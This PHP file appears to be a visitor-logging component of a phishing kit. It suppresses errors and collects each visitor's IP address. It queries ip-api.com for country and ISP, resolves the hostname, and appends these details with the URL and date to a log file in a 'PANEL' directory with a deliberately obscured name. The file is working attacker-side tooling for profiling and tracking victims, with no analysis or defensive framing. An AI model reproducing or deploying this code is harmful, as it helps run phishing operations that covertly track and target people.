<?php
include('OS.BWS.php');
session_start();
error_reporting(0);
//////////////////////////////////////////////////////////
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
$LOOKUP_COUNTRY = $IP_LOOKUP->country;
$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
$LOOKUP_ISP = $IP_LOOKUP->isp;
$v_isp = gethostbyaddr($ip);
$date_format = ("D|M|Y");
//////////////////////////////////////////////////////////
$url = $_SERVER['HTTP_HOST'] . '' . $_SERVER['REQUEST_URI'];
$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_CNTRCODE;
$_SESSION['_LOOKUP_ISP_'] = $LOOKUP_ISP;
//////////////////////////////////////////////////////////
$VISITOR_MESSAGE= "<center>👨🏻‍✈️
<div style='font-size: 11px;font-family:monospace;font-weight:100;'>
[ 🔎 - 🔌 ] *  :  [ ".$_SESSION['_ip_']." - ".$_SESSION['_LOOKUP_ISP_']." ] <br> [ 🖥 ] *  :  [ $v_isp ] <br>[ 🚩 ] *  :  [ ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_CNTRCODE_']." ] <br>[ 💻 - 🌐 ] *  :  [ $device_details ] <br>[ 🔗 ] * : [ $url ]<br>
<font style='color:black;text-size:3px;'>[ 📆 ] * :  [ ".date('d-m-Y')." ] - $date_format</font><br>
•••••••••••••••<br/>
</div></center>";
$khraha = fopen("./PANEL/CLIENTS.48h606q36Dr215p73lENDra7i223g706V8p3d78hQ1Mrj714rERi6662GcdSRAtW06B1086IwR71e3XHw52756UYhN73t5100Qr5/CLIENTS.php", "a");
fwrite($khraha, $VISITOR_MESSAGE);
?>
